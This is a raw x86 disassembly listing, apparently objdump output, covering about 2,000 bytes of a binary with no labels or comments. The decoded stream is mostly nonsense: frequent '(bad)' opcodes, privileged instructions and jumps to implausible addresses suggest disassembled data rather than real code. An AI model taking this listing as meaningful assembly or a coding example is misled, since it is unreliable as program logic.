  425b75:	add    BYTE PTR [edx+0x79],ah
  425b78:	call   0x289e6b8f
  425b7d:	mov    bl,0x32
  425b7f:	push   esi
  425b80:	stos   BYTE PTR es:[edi],al
  425b81:	rcl    DWORD PTR ds:0x4ce39256,cl
  425b87:	xchg   edx,eax
  425b88:	inc    eax
  425b89:	aad    0x2f
  425b8b:	(bad)  
  425b8d:	jg     0x425b31
  425b8f:	sub    eax,0x330f3488
  425b94:	hlt    
  425b95:	sub    eax,0xf40096e5
  425b9a:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425b9c:	or     eax,DWORD PTR [esi+0x4cffd0e]
  425ba2:	(bad)  
  425ba3:	(bad)  
  425ba5:	jle    0x425b5f
  425ba7:	int    0x0
  425ba9:	jge    0x425bd2
  425bab:	fwait
  425bac:	inc    ebp
  425bad:	lds    edi,FWORD PTR [ecx]
  425baf:	fadd   QWORD PTR [eax]
  425bb1:	jmp    0x563cba17
  425bb6:	pop    ds
  425bb7:	or     edx,DWORD PTR [ebx+0x64]
  425bba:	pop    edx
  425bbb:	std    
  425bbc:	and    cl,al
  425bbe:	adc    edx,DWORD PTR [edx+0x6cdbc6fb]
  425bc4:	and    eax,0xd96111
  425bc9:	fs cmp bh,ch
  425bcc:	sbb    al,0x60
  425bce:	dec    edx
  425bcf:	std    
  425bd0:	sbb    al,0x91
  425bd2:	jg     0x425b6a
  425bd4:	sti    
  425bd5:	sahf   
  425bd6:	pop    ebp
  425bd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425bd8:	jne    0x425bbc
  425bda:	add    BYTE PTR [edx-0x3de273f5],dl
  425be0:	(bad)  
  425be1:	call   0xfae56963
  425be6:	jb     0x425c22
  425be8:	std    
  425be9:	sub    al,0xe8
  425beb:	popa   
  425bec:	fld    DWORD PTR [ebp-0x1a15d65a]
  425bf2:	lock es xchg ebx,eax
  425bf5:	jmp    0x11b0364
  425bfa:	sbb    bl,BYTE PTR [esi+0x3eac5b03]
  425c00:	pop    edx
  425c01:	vpunpcklbw xmm3,xmm4,xmm1
  425c05:	add    BYTE PTR [ebx],ch
  425c07:	jp     0x425bb0
  425c09:	dec    edi
  425c0a:	lahf   
  425c0b:	push   edi
  425c0c:	frstor [esi-0x17]
  425c0f:	(bad)  
  425c11:	dec    eax
  425c12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425c13:	and    eax,0xeb4085d9
  425c18:	int3   
  425c19:	cld    
  425c1a:	stc    
  425c1b:	mov    eax,ds:0xcd1985d9
  425c20:	stos   DWORD PTR es:[edi],eax
  425c21:	jne    0x425c23
  425c23:	ss pop esi
  425c25:	pop    ds
  425c26:	add    BYTE PTR [eax-0x21],dl
  425c29:	sub    esi,esi
  425c2b:	(bad)  
  425c2c:	dec    ebx
  425c2d:	jne    0x425c63
  425c2f:	loope  0x425bc7
  425c31:	or     BYTE PTR fs:[eax+ebx*4],bh
  425c35:	inc    edx
  425c36:	jg     0x425c7f
  425c38:	(bad)  
  425c3a:	adc    eax,0x3aab2f
  425c3f:	add    BYTE PTR [edx+0x47c083d8],al
  425c45:	lods   eax,DWORD PTR ds:[esi]
  425c46:	mov    edi,0xfa8b1740
  425c4b:	dec    DWORD PTR [ebx]
  425c4d:	es pop es
  425c4f:	mov    eax,ebp
  425c51:	and    ebx,DWORD PTR [eax+0x1c]
  425c54:	shr    BYTE PTR [edx-0x430c377d],1
  425c5a:	mov    ebx,0xc725cb00
  425c5f:	call   0x43fa34
  425c64:	or     BYTE PTR [ebx-0x7f7a4a9],bl
  425c6a:	sub    esp,0x11d4e4a
  425c70:	mov    ebx,0x305649da
  425c75:	dec    ebx
  425c76:	dec    esi
  425c77:	mov    eax,DWORD PTR [ecx]
  425c79:	daa    
  425c7a:	out    dx,eax
  425c7b:	sysret 
  425c7d:	outs   dx,DWORD PTR ds:[esi]
  425c7e:	add    DWORD PTR [eax],eax
  425c80:	jnp    0x425cb1
  425c82:	rcr    BYTE PTR ds:[esi+0x6d],1
  425c86:	neg    BYTE PTR [edi-0x40805e75]
  425c8c:	mov    ebx,edx
  425c8e:	add    BYTE PTR [ebx-0x1c845122],cl
  425c94:	jp     0x425c6d
  425c96:	add    eax,0x19d36e8
  425c9b:	add    BYTE PTR [edx+0x3b],ah
  425c9e:	mov    es,WORD PTR [ebp-0x578578ac]
  425ca4:	add    BYTE PTR [edx-0x50],ah
  425ca7:	(bad)  
  425ca8:	jle    0x425c69
  425caa:	test   al,0xfe
  425cac:	jae    0x425c51
  425cae:	scas   eax,DWORD PTR es:[edi]
  425caf:	or     al,0x8
  425cb1:	loope  0x425ccf
  425cb3:	xchg   esi,eax
  425cb4:	cli    
  425cb5:	and    eax,0xef8d05bf
  425cba:	xchg   DWORD PTR [ebx+0x469815fb],eax
  425cc0:	int3   
  425cc1:	or     al,0x97
  425cc3:	cmp    bl,0x8e
  425cc6:	lods   eax,DWORD PTR ds:[esi]
  425cc7:	sub    edx,DWORD PTR [edx-0x11]
  425cca:	xor    al,0x9d
  425ccc:	cli    
  425ccd:	cmc    
  425cce:	outs   dx,BYTE PTR ds:[esi]
  425ccf:	popf   
  425cd0:	cmp    eax,0xc382761c
  425cd5:	fild   WORD PTR [edi-0x7d]
  425cd8:	sti    
  425cd9:	fnstsw WORD PTR [ebx+0x3562fffe]
  425cdf:	xor    BYTE PTR [edi+ebx*2-0x11],0x2a
  425ce4:	(bad)  
  425ce5:	xlat   BYTE PTR ds:[ebx]
  425ce6:	inc    edi
  425ce7:	cmp    ebx,0xffffffbd
  425cea:	inc    edi
  425ceb:	(bad)  
  425ced:	mov    ah,0x2e
  425cef:	jbe    0x425d33
  425cf1:	push   esi
  425cf2:	imul   edi,DWORD PTR [ebx-0x3accea8b],0xffffffd0
  425cf9:	xor    dh,BYTE PTR ds:0x3d32303b
  425cff:	xor    al,dh
  425d01:	push   ecx
  425d02:	stc    
  425d03:	pushf  
  425d04:	mov    ebp,0x83feb14a
  425d09:	add    BYTE PTR [edx+0x5265cd6b],ah
  425d0f:	cmp    eax,0x512203b
  425d14:	inc    eax
  425d15:	lock adc bl,cl
  425d18:	and    dh,cl
  425d1a:	mov    ebp,0xd503a7cb
  425d1f:	popf   
  425d20:	in     al,0x80
  425d22:	and    ch,BYTE PTR [edi]
  425d24:	(bad)  
  425d25:	sbb    DWORD PTR [esi+0x9],ebx
  425d28:	add    edx,ecx
  425d2a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425d2b:	and    al,0xa4
  425d2d:	add    edi,DWORD PTR [ecx]
  425d2f:	iret   
  425d30:	repz rep ins DWORD PTR es:[edi],dx
  425d33:	fldenv [esp+eax*8-0x52]
  425d37:	fisub  WORD PTR [esi-0x1d]
  425d3a:	sbb    eax,0xd5d2e6b0
  425d3f:	pop    esi
  425d40:	test   al,0xf
  425d42:	push   dx
  425d44:	sbb    BYTE PTR [ebx+0x109f5e57],bl
  425d4a:	popa   
  425d4b:	push   eax
  425d4c:	stos   BYTE PTR es:[edi],al
  425d4d:	fwait
  425d4e:	xor    edx,DWORD PTR [edi-0x66c2fc18]
  425d54:	or     esp,DWORD PTR [esi]
  425d56:	lea    edx,[edx+0x4fddfba6]
  425d5c:	icebp  
  425d5d:	sub    eax,0x9bfc0add
  425d62:	cmp    DWORD PTR [edi-0x5622fc18],edx
  425d68:	ins    DWORD PTR es:[edi],dx
  425d69:	lea    esi,[esi]
  425d6b:	out    dx,eax
  425d6c:	or     eax,0xd93c0000
  425d71:	jb     0x425d43
  425d73:	and    eax,0xa9042424
  425d78:	into   
  425d79:	arpl   bx,si
  425d7b:	pop    ebp
  425d7c:	fldenv [ebx+eax*8+0xe]
  425d80:	fisub  WORD PTR [esi-0x1d]
  425d83:	lea    ebp,[edi+0x5ec5d2e6]
  425d89:	sub    BYTE PTR [edi],cl
  425d8b:	push   dx
  425d8d:	clc    
  425d8e:	and    eax,0x270150b5
  425d93:	leave  
  425d94:	mov    dh,0xc0
  425d96:	jmp    0xc80351fc
  425d9b:	and    BYTE PTR [esi-0x38],bl
  425d9e:	xchg   ebp,eax
  425d9f:	inc    eax
  425da0:	pop    ebp
  425da1:	iret   
  425da2:	popf   
  425da3:	inc    esp
  425da4:	and    edi,DWORD PTR [ebp-0x3b]
  425da7:	inc    ebp
  425da8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425da9:	jbe    0x425da2
  425dab:	in     al,0x2c
  425dad:	and    eax,0xfa0a73e5
  425db2:	fsubr  QWORD PTR [ecx-0x3716bf2c]
  425db8:	mov    esi,0xcde7384e
  425dbd:	nop
  425dbe:	cli    
  425dbf:	mov    eax,ds:0x3ffde5d9
  425dc4:	hlt    
  425dc5:	repnz daa 
  425dc7:	jecxz  0x425d59
  425dc9:	cli    
  425dca:	ins    BYTE PTR es:[edi],dx
  425dcb:	mov    ecx,0x13a743cf
  425dd0:	stos   BYTE PTR es:[edi],al
  425dd1:	mov    ss:0xc317f700,eax
  425dd7:	mov    ebp,cr3
  425dda:	add    BYTE PTR [ecx+ebx*1+0x2d],ch
  425dde:	push   ds
  425ddf:	adc    BYTE PTR fs:0xfd5a6a1a,ch
  425de6:	add    al,0xe9
  425de8:	pop    ebp
  425de9:	iret   
  425dea:	stc    
  425deb:	std    
  425dec:	popf   
  425ded:	xlat   BYTE PTR ds:[ebx]
  425dee:	dec    esi
  425def:	sbb    bh,bl
  425df1:	int    0xa8
  425df3:	fisub  DWORD PTR [ecx]
  425df5:	fxam   
  425df7:	iret   
  425df8:	jae    0x425e04
  425dfa:	cli    
  425dfb:	cld    
  425dfc:	adc    eax,0xfae940ca
  425e01:	int3   
  425e02:	push   edx
  425e03:	sbb    bl,ah
  425e05:	push   ss
  425e06:	jle    0x425e29
  425e08:	fistp  WORD PTR [ebp-0x38]
  425e0b:	add    BYTE PTR [edx+eiz*8-0x42],dh
  425e0f:	xor    ebp,DWORD PTR ds:0xbf0fc492
  425e15:	gs push edi
  425e17:	ret    0xd77f
  425e1a:	or     ecx,0xffffffff
  425e1d:	mov    ecx,0xbdefd285
  425e22:	jnp    0x425ea0
  425e24:	pop    ds
  425e25:	mov    ds:0x5e257bfa,eax
  425e2a:	jne    0x425e50
  425e2c:	dec    edi
  425e2d:	jmp    0x5f515d81
  425e32:	or     al,BYTE PTR [eax+0x3b]
  425e35:	inc    edx
  425e36:	pop    ss
  425e37:	push   edx
  425e38:	add    dl,cl
  425e3a:	pop    ebp
  425e3b:	adc    al,0x60
  425e3d:	sbb    DWORD PTR [edi],edx
  425e3f:	add    ebx,ebp
  425e41:	pmaddwd mm5,QWORD PTR [ecx]
  425e44:	idiv   BYTE PTR ds:0x7effc958
  425e4a:	pop    edi
  425e4b:	push   es
  425e4c:	inc    ebp
  425e4d:	int    0x89
  425e4f:	lock cmp esi,DWORD PTR [ecx+0x55c63ead]
  425e56:	xchg   edi,eax
  425e57:	add    eax,0x3896e800
  425e5c:	inc    esp
  425e5d:	scas   eax,DWORD PTR es:[edi]
  425e5e:	mov    ds:0xa7c30c78,al
  425e63:	outs   dx,BYTE PTR ds:[esi]
  425e64:	or     eax,0x4432167b
  425e69:	lahf   
  425e6a:	mov    ds:0x96f8f476,al
  425e6f:	mov    ebx,0xc021cb04
  425e74:	jmp    0x425ea8
  425e76:	hlt    
  425e77:	xor    DWORD PTR [edi+ebx*4-0x62],0x3e8f4e83
  425e7f:	add    al,0xc1
  425e81:	mov    edx,esi
  425e83:	or     DWORD PTR [esi],0xc0841862
  425e89:	bound  esi,QWORD PTR [eax+0x86a4a79]
  425e8f:	mov    eax,es
  425e91:	bound  esi,QWORD PTR [eax-0x4f9941dc]
  425e97:	sub    al,0x87
  425e99:	jae    0x425eb3
  425e9b:	jmp    0x448c:0xb05d00ff
  425ea2:	jle    0x425e4c
  425ea4:	push   DWORD PTR [ebx+0x65]
  425ea7:	aaa    
  425ea8:	mov    ah,0xe8
  425eaa:	es lock std 
  425ead:	(bad)  
  425eae:	jmp    0x5f0082a4
  425eb3:	mov    al,0x2c
  425eb5:	xchg   DWORD PTR [ebx],esi
  425eb7:	inc    ebx
  425eb8:	sar    edx,1
  425eba:	sbb    eax,0xa29e22ba
  425ebf:	mov    al,0x3d
  425ec1:	jp     0x425f29
  425ec3:	or     ah,BYTE PTR ds:0x8a6ad94f
  425ec9:	inc    edx
  425eca:	pop    edx
  425ecb:	scas   eax,DWORD PTR es:[edi]
  425ecc:	inc    ebx
  425ecd:	jg     0x425f09
  425ecf:	mov    cl,0xf9
  425ed1:	or     cl,ah
  425ed3:	outs   dx,DWORD PTR ds:[esi]
  425ed4:	or     DWORD PTR [eax-0x6],edx
  425ed7:	or     al,0x7e
  425ed9:	sti    
  425eda:	in     eax,0xfa
  425edc:	cmp    DWORD PTR [edi+0xc00b78a],0x86da5c50
  425ee6:	sbb    al,0xb8
  425ee8:	ffreep st(2)
  425eea:	sbb    al,0xbc
  425eec:	into   
  425eed:	popf   
  425eee:	and    dh,BYTE PTR [eax+0x6fcee8e0]
  425ef4:	add    eax,0xd7bf1300
  425ef9:	push   ecx
  425efa:	or     eax,0x7a240137
  425eff:	fxch   st(5)
  425f01:	add    eax,0xe36a6900
  425f06:	mov    WORD PTR [esi],ds
  425f08:	std    
  425f09:	sti    
  425f0a:	loope  0x425f10
  425f0c:	mov    eax,ds:0x3b6af7f3
  425f11:	dec    DWORD PTR [ecx+0x69]
  425f14:	pop    esp
  425f15:	popa   
  425f16:	add    al,0x62
  425f18:	fxch   st(1)
  425f1a:	mov    es,WORD PTR [esi]
  425f1c:	std    
  425f1d:	retf   
  425f1e:	jmp    0x240e8d07
  425f23:	shl    ah,0x3c
  425f26:	adc    esp,ecx
  425f28:	push   edi
  425f29:	call   0x362ec131
  425f2e:	jmp    0x56c0:0xf7c84e6
  425f35:	or     eax,0xac9760f8
  425f3a:	daa    
  425f3b:	inc    esi
  425f3c:	(bad)  
  425f3e:	push   ss
  425f3f:	jmp    0x5497:0x3d200c05
  425f46:	or     DWORD PTR [ebp+0x63f8fdb1],ecx
  425f4c:	aaa    
  425f4d:	adc    ebx,ebx
  425f4f:	jmp    FWORD PTR [eax+ecx*2]
  425f52:	xchg   DWORD PTR [ebx],esp
  425f54:	(bad)  
  425f55:	adc    eax,0x18a0638f
  425f5a:	adc    ch,bl
  425f5c:	test   eax,0x25d98167
  425f61:	cmp    BYTE PTR [edi-0x11080ae2],cl
  425f67:	add    bl,dl
  425f69:	icebp  
  425f6a:	out    0xf3,al
  425f6c:	pop    ebp
  425f6d:	and    eax,0x3385ee24
  425f72:	call   0x4091850
  425f77:	sbb    ah,BYTE PTR [edx]
  425f79:	fld    DWORD PTR [eax]
  425f7b:	push   0x7b
  425f7d:	(bad)  [ecx]
  425f7f:	ss push 0xa9f5c520
  425f85:	sbb    BYTE PTR [ebp-0x10],dh
  425f88:	in     al,0xb1
  425f8a:	adc    al,0xdc
  425f8c:	ins    DWORD PTR es:[edi],dx
  425f8d:	aaa    
  425f8e:	sbb    eax,0x11376742
  425f93:	je     0x425f40
  425f95:	fcom   QWORD PTR [ecx-0x67]
  425f98:	loopne 0x425f60
  425f9a:	pop    esp
  425f9b:	fbld   TBYTE PTR [ecx+0x6d257fa0]
  425fa1:	pop    ecx
  425fa2:	jge    0x425f71
  425fa4:	jne    0x425f7f
  425fa6:	je     0x425f99
  425fa8:	cmp    edx,DWORD PTR [ecx+0x5b]
  425fab:	leave  
  425fac:	cmp    edx,DWORD PTR [ecx+0x6b]
  425faf:	retf   
  425fb0:	icebp  
  425fb1:	fxam   
  425fb3:	jmp    0x426024
  425fb5:	cdq    
  425fb6:	pop    edx
  425fb7:	lahf   
  425fb8:	inc    edx
  425fb9:	pop    es
  425fba:	pop    eax
  425fbb:	sub    edx,DWORD PTR [ebp-0x27]
  425fbe:	push   ebx
  425fbf:	bound  ecx,QWORD PTR [ebp-0x20ee12e0]
  425fc5:	sbb    eax,0xa36e909
  425fca:	push   edx
  425fcb:	bound  eax,QWORD PTR [eax]
  425fcd:	test   eax,0x668784d4
  425fd2:	fld    DWORD PTR [eax]
  425fd4:	push   0xfffffff5
  425fd6:	rol    DWORD PTR [eax],cl
  425fd8:	out    dx,al
  425fd9:	in     eax,0x3c
  425fdb:	add    ecx,ebp
  425fdd:	popa   
  425fde:	aaa    
  425fdf:	sub    DWORD PTR [ebp+eiz*4-0x79],ebx
  425fe3:	addr16 jmp 0x557029a
  425fe9:	push   0x95620119
  425fee:	xlat   BYTE PTR ds:[ebx]
  425fef:	jge    0x425f96
  425ff1:	push   edx
  425ff2:	and    bh,al
  425ff4:	add    ah,bl
  425ff6:	adc    DWORD PTR [eax+ebx*8-0x46],eax
  425ffa:	fild   DWORD PTR [eax]
  425ffc:	add    bl,ah
  425ffe:	ror    BYTE PTR [ecx],0x1
  426001:	mov    ecx,DWORD PTR [esp+ecx*2+0xc]
  426005:	or     BYTE PTR [edi],cl
  426007:	test   BYTE PTR [ecx+0x6e8ffc6],0x88
  42600e:	fiadd  DWORD PTR [eax]
  426010:	mov    ebp,DWORD PTR [esi+0x2b4587cb]
  426016:	pop    eax
  426017:	div    BYTE PTR [esi+ecx*4+0x4c]
  42601b:	je     0x426031
  42601d:	mul    BYTE PTR [edx]
  42601f:	jne    0x426037
  426021:	rol    BYTE PTR [ebx],0x82
  426024:	iret   
  426025:	jae    0x426084
  426027:	mov    dh,0x0
  426029:	cmp    ecx,DWORD PTR [esi-0x37]
  42602c:	mov    esi,esi
  42602e:	cmp    cl,BYTE PTR [eax+0x5267004d]
  426034:	je     0x42601e
  426036:	push   eax
  426037:	aam    0x81
  426039:	dec    ebp
  42603a:	addr16 push esp
  42603c:	jl     0x42601a
  42603e:	cmp    esp,DWORD PTR [edi-0x5eb47ae2]
  426044:	sbb    al,BYTE PTR [ebp-0x7b015904]
  42604a:	shl    BYTE PTR [esi-0x2ebf72ee],cl
  426050:	mov    esi,DWORD PTR [ebp-0x4d]
  426053:	dec    ebp
  426054:	adc    BYTE PTR [esi+0x1c],dl
  426057:	test   DWORD PTR [esi],eax
  426059:	and    DWORD PTR [ebx],0x5a
  42605c:	jne    0x426062
  42605e:	imul   ebx,ebx,0xffffffe1
  426061:	sbb    al,0x40
  426063:	xchg   edi,eax
  426064:	fimul  DWORD PTR [ebx-0x40dbcced]
  42606a:	mov    ebx,0x624d81da
  42606f:	fs sbb ax,0xb0fd
  426074:	inc    BYTE PTR [esi+0x15664c27]
  42607a:	in     eax,dx
  42607b:	mov    al,0xfe
  42607d:	sub    eax,0x56dec7a2
  426082:	stos   DWORD PTR es:[edi],eax
  426083:	jb     0x426093
  426085:	add    BYTE PTR [edi],ch
  426087:	sub    ebp,DWORD PTR [edx+0x7f]
  42608a:	jle    0x426064
  42608c:	rcl    DWORD PTR [ecx+0x2d],cl
  42608f:	pop    es
  426090:	repz pop es
  426092:	xor    ebx,ebp
  426094:	mov    ecx,?
  426096:	add    cl,ch
  426098:	jecxz  0x426024
  42609a:	dec    ebp
  42609b:	jp     0x4260c6
  42609d:	(bad)  
  42609f:	fistp  DWORD PTR [ebp+0x72]
  4260a2:	call   0xfbc2cac5
  4260a7:	fsubp  st(7),st
  4260a9:	icebp  
  4260aa:	and    al,0x4d
  4260ac:	inc    ebp
  4260ad:	or     cl,BYTE PTR [ebp-0x529a4369]
  4260b3:	mov    eax,0xaf8780ce
  4260b8:	pushf  
  4260b9:	add    eax,0xffffffb6
  4260bc:	add    DWORD PTR [ecx+0x513b4e75],0xfffffffb
  4260c3:	xchg   edi,eax
  4260c4:	sbb    al,0xfa
  4260c7:	(bad)
  4260cb:	or     al,0x7f
  4260cd:	jp     0x426055
  4260cf:	sub    bh,BYTE PTR [ebx]
  4260d1:	dec    ebx
  4260d2:	call   0x47ae95
  4260d7:	jmp    0xb72acdc0
  4260dc:	sbb    eax,0xc6850005
  4260e1:	xchg   BYTE PTR [edi+0x103f7939],bh
  4260e7:	(bad)  
  4260e8:	fnstcw WORD PTR [ecx]
  4260ea:	mov    edx,ebx
  4260ec:	add    eax,0x1b5dd66f
  4260f1:	call   DWORD PTR [ecx-0x76]
  4260f4:	dec    esp
  4260f5:	sbb    cl,BYTE PTR [eax]
  4260f7:	retf   0x41f5
  4260fa:	add    al,0x0
  4260fc:	bound  edx,QWORD PTR [ebp-0x58]
  4260ff:	stc    
  426100:	pop    esi
  426101:	pop    edx
  426102:	mov    al,ds:0x66ef857f
  426107:	add    BYTE PTR [esi],bh
  426109:	int    0xe7
  42610b:	imul   DWORD PTR [edx+0x52]
  42610e:	mov    ds:0x98fd0b,al
  426113:	add    esp,DWORD PTR [eax]
  426115:	aad    0xbd
  426117:	sub    edi,DWORD PTR [ecx+0x24]
  42611a:	or     al,0x14
  42611c:	adc    bl,BYTE PTR [esi+0x1953dfd5]
  426122:	call   0x5f1087a9
  426127:	(bad)  
  426128:	pop    ebp
  426129:	dec    esi
  42612a:	mov    al,0x4
  42612c:	fisttp DWORD PTR [ebx]
  42612e:	lock fisubr WORD PTR [ebx-0x6ffc1369]
  426135:	push   eax
  426136:	sbb    DWORD PTR [ebx-0x75100a5a],ecx
  42613c:	mov    al,ds:0x7a4c8ed1
  426141:	xor    BYTE PTR [eax],ch
  426143:	sub    al,0xb1
  426145:	dec    esi
  426146:	push   0x7
  426148:	adc    eax,0x5506e6cc
  42614d:	int3   
  42614e:	push   ebp
  42614f:	or     esi,DWORD PTR [edx+0xa2c394e]
  426155:	push   es
  426156:	mov    eax,DWORD PTR [ebx]
  426158:	bound  esi,QWORD PTR [eax+0x562231e6]
  42615e:	test   al,0xf7
  426160:	add    BYTE PTR [ebp-0x64],dl
  426163:	add    DWORD PTR [edi],esp
  426165:	outs   dx,BYTE PTR ds:[esi]
  426166:	push   esp
  426167:	push   ebx
  426168:	loope  0x426132
  42616a:	mov    gs,WORD PTR [ecx]
  42616c:	jb     0x42618a
  42616e:	mov    cl,0xae
  426170:	pop    esp
  426171:	popa   
  426172:	fstp   DWORD PTR [ecx+0x37]
  426175:	and    ch,dl
  426177:	add    BYTE PTR [edx-0x73],ah
  42617a:	clc    
  42617b:	add    al,0xc2
  42617d:	xchg   esi,eax
  42617e:	aam    0x6d
  426180:	out    dx,eax
  426181:	(bad)  
  426182:	or     cl,BYTE PTR [ecx]
  426184:	add    dh,BYTE PTR [eax]
  426186:	icebp  
  426187:	jge    0x426131
  426189:	pop    ebp
  42618a:	mov    cl,0x92
  42618c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42618d:	popa   
  42618e:	fnstcw WORD PTR [esi-0x79f89e1b]
  426194:	pop    eax
  426195:	and    al,0xd7
  426197:	je     0x426124
  426199:	mov    eax,ds:0x8577e29c
  42619e:	pushf  
  42619f:	cli    
  4261a0:	aaa    
  4261a1:	popf   
  4261a2:	clc    
  4261a3:	or     al,ch
  4261a5:	push   ebp
  4261a6:	xlat   BYTE PTR ds:[ebx]
  4261a7:	test   DWORD PTR [edi],ebx
  4261a9:	leave  
  4261aa:	mov    dl,0xbc
  4261ac:	jmp    0xc005b612
  4261b1:	mov    ds:0xcd6800d5,eax
  4261b6:	sar    edi,1
  4261b8:	call   0x9f966e1e
  4261bd:	fsub   DWORD PTR [ebp+eiz*1-0x1f]
  4261c1:	pop    esi
  4261c2:	fld    DWORD PTR [eax]
  4261c4:	sahf   
  4261c5:	add    al,ch
  4261c7:	add    BYTE PTR [esi+0x2d9ee000],0xf6
  4261ce:	jecxz  0x42624c
  4261d0:	add    ecx,ebp
  4261d2:	popa   
  4261d3:	pop    edx
  4261d4:	sti    
  4261d5:	jns    0x42623c
  4261d7:	fld    DWORD PTR [eax]
  4261d9:	fsubrp st(6),st
  4261db:	mov    BYTE PTR [ecx],al
  4261dd:	add    bl,bh
  4261df:	xlat   BYTE PTR ds:[ebx]
  4261e0:	sub    ebp,0x2f
  4261e3:	mov    DWORD PTR ds:0x79d58eb7,0x9a3c9f8
  4261ed:	add    DWORD PTR [ebx],0xffffffc6
  4261f0:	add    eax,0xd54185
  4261f5:	add    BYTE PTR [ecx+edx*4],cl
  4261f8:	push   ds
  4261f9:	adc    BYTE PTR [edi+0x3e0000d7],bh
  4261ff:	and    esi,DWORD PTR [ebp+0xb]
  426202:	dec    ebp
  426203:	mov    cl,BYTE PTR [ebp-0x174050b4]
  426209:	sbb    al,0xc2
  42620b:	sbb    dh,dh
  42620d:	add    BYTE PTR [eax-0x2b],0x74
  426211:	pop    ebx
  426212:	je     0x426279
  426214:	inc    edx
  426215:	add    al,BYTE PTR [esi]
  426217:	xchg   ebx,eax
  426218:	into   
  426219:	cmp    ecx,DWORD PTR [edx-0x59]
  42621c:	dec    edx
  42621d:	push   0xd533
  426222:	xchg   ecx,eax
  426223:	xlat   BYTE PTR ds:[ebx]
  426224:	cmc    
  426225:	xor    eax,0x3e9e03
  42622a:	add    BYTE PTR [edx+eax*8-0x2904ef04],al
  426231:	cmp    eax,0x15751cbe
  426237:	ror    BYTE PTR [ecx+ebp*8],0xa2
  42623b:	call   0x7b756316
  426240:	adc    al,0xfe
  426242:	jae    0x4261dd
  426244:	xchg   ebp,eax
  426245:	cli    
  426246:	adc    BYTE PTR gs:[edx+eax*2-0xa15f615],0x85
  42624f:	add    al,0xa3
  426251:	push   ss
  426252:	mov    ecx,ebp
  426254:	push   ecx
  426255:	ret    0x6266
  426258:	cmp    ebp,esi
  42625a:	adc    ecx,DWORD PTR [edx]
  42625c:	(bad)  
  42625d:	mov    edx,0xc5296200
  426262:	pandn  mm6,QWORD PTR [eax-0xd]
  426266:	or     ecx,ebp
  426268:	stos   DWORD PTR es:[edi],eax
  426269:	call   0x7d7e4b6e
  42626e:	adc    BYTE PTR [ecx-0x463c768d],dl
  426274:	jnp    0x4261f9
  426276:	in     eax,dx
  426277:	ss mov esp,esi
  42627a:	jg     0x4262de
  42627c:	mov    al,0xfe
  42627e:	mov    WORD PTR ds:0xfffe6e8,?
  426284:	sbb    edx,DWORD PTR [ebx]
  426286:	fs je  0x426279
  426289:	add    al,0x7f
  42628b:	sahf   
  42628c:	jl     0x426217
  42628e:	int    0x0
  426290:	jp     0x4262b3
  426292:	inc    ebp
  426293:	add    BYTE PTR [edx+0x60],ah
  426296:	rcl    DWORD PTR [ecx+0x7d],cl
  426299:	popf   
  42629a:	ficom  DWORD PTR [ecx]
  42629c:	and    dh,BYTE PTR [eax-0x79a13b7f]
  4262a2:	sub    cl,BYTE PTR [ebp+0x4fd1821d]
  4262a8:	pop    ebp
  4262a9:	jge    0x426285
  4262ab:	adc    DWORD PTR [edx+0x5ec481b0],esp
  4262b1:	(bad)  
  4262b2:	mov    esp,0xdc5b222f
  4262b7:	pop    esp
  4262b8:	cdq    
  4262b9:	xor    DWORD PTR [edx+0x8],eax
  4262bc:	arpl   WORD PTR [eax-0x4f994202],si
  4262c2:	rol    DWORD PTR [esi+0x55069486],1
  4262c8:	jmp    0x7289eba5
  4262cd:	inc    edx
  4262ce:	leavew 
  4262d0:	into   
  4262d1:	fsub   st,st(7)
  4262d3:	add    ebx,ebp
  4262d5:	adc    edi,eax
  4262d7:	mov    WORD PTR ds:0x9f8f49c9,?
  4262dd:	lds    eax,FWORD PTR [ecx-0x73]
  4262e0:	sub    eax,0x55e166c5
  4262e5:	fdecstp 
  4262e7:	inc    ebx
  4262e8:	dec    edx
  4262e9:	pop    ecx
  4262ea:	call   0x6175c4f2
  4262ef:	shl    DWORD PTR [ecx+0x4c],0x1d
  4262f3:	int3   
  4262f4:	add    dh,dl
  4262f6:	adc    eax,0x9a2dd230
  4262fb:	std    
  4262fc:	xlat   BYTE PTR ds:[ebx]
  4262fd:	push   ebx
  4262fe:	sbb    eax,ebp
  426300:	mov    ss:0x3c027132,al
  426306:	in     eax,dx
  426307:	jp     0x426300
  426309:	ins    DWORD PTR es:[edi],dx
  42630a:	dec    esp
  42630b:	daa    
  42630c:	adc    dh,BYTE PTR [edx]
  42630e:	call   0xede8:0x1973d7d5
  426315:	cmp    DWORD PTR [ebp+eiz*4+0x11],ecx
  426319:	add    al,0xd9
  42631b:	mov    bh,0x7a
  42631d:	dec    edi
  42631e:	xor    eax,0x566dc3f2
  426323:	sub    al,0x20
  426325:	or     ah,bh
  426327:	sahf   
  426328:	inc    ebp
  426329:	data16 fstp DWORD PTR [esi+ecx*4+0xba56546]
  426331:	mov    al,0x30
  426333:	outs   dx,DWORD PTR ds:[esi]
  426334:	jge    0x4262f2
  426336:	fldcw  WORD PTR [esi-0xd]
  426339:	gs pop esp
  42633b:	sub    al,BYTE PTR [eax]
  42633d:	mov    esp,0x61c260da
  426342:	lods   eax,DWORD PTR fs:[esi]
  426344:	pop    es
  426345:	fcmovnu st,st(7)
  426347:	outs   dx,BYTE PTR ds:[esi]
  426348:	retf   
  426349:	add    DWORD PTR gs:[ecx],0xfa94f809
  426350:	cdq    
  426351:	call   FWORD PTR [eax+0x29562c8d]
  426357:	addr16 call 0x72d6765d
  42635d:	in     eax,0x78
  42635f:	sub    al,0x5
  426361:	push   0xffffff9e
  426363:	xchg   esp,eax
  426364:	test   BYTE PTR [ecx-0xeb3e2a8],ch
  42636a:	mov    eax,0xbb17c05f
  42636f:	push   esi
  426370:	or     ecx,ebp
  426372:	mov    dl,0x5f
  426374:	in     eax,dx
  426375:	cmp    ch,dl
  426377:	push   ds
  426378:	or     DWORD PTR [edi],esi
  42637a:	xchg   ecx,eax
  42637b:	pop    edi
  42637c:	clc    
  42637d:	add    ebx,DWORD PTR [esi+0x60]
  426380:	jb     0x426363
  426382:	in     al,0x9b
  426384:	add    eax,0x43625f13
  426389:	in     eax,0xec
  42638b:	push   ds
  42638c:	or     eax,0x4a606360
  426391:	loope  0x426377
  426393:	dec    BYTE PTR [eax]
